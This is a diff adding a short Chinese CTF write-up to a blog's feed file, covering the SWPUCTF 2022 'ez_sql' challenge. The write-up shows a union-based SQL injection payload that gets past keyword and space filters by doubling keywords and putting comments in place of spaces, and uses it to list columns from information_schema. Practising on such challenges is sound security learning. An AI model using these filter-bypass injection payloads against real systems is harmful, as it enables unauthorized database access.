@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>note-nssctf-01</title>
+    <link href="/2025/03/17/note-nssctf-01/"/>
+    <url>/2025/03/17/note-nssctf-01/</url>
+    
+    <content type="html"><![CDATA[<h1 id="SWPUCTF-2022-新生赛-ez-sql"><a href="#SWPUCTF-2022-新生赛-ez-sql" class="headerlink" title="[SWPUCTF 2022 新生赛]ez_sql"></a>[SWPUCTF 2022 新生赛]ez_sql</h1><p>题目说参数为nss，get传nss&#x3D;1<br>提示要用更安全的传参法，那就post了<br>post:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">nss=<span class="hljs-number">1</span><span class="hljs-string">&#x27;  //报错</span><br><span class="hljs-string">nss=1&#x27;</span><span class="hljs-comment">#  //成功闭合</span><br></code></pre></td></tr></table></figure><p>用联合注入发现被过滤了union，空格<br>双写绕过即可<br>爆字段payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">nss=<span class="hljs-string">&#x27; uunionnion/**/select/**/1,database(),group_concat(column_name)from/**/infoorrmation_schema.columns/**/where/**/table_name=&#x27;</span>NSS_tb<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure><p>到这步就差不多了</p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>nssctf</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>note-14</title>
     <link href="/2025/03/16/note-14/"/>
     <url>/2025/03/16/note-14/</url>
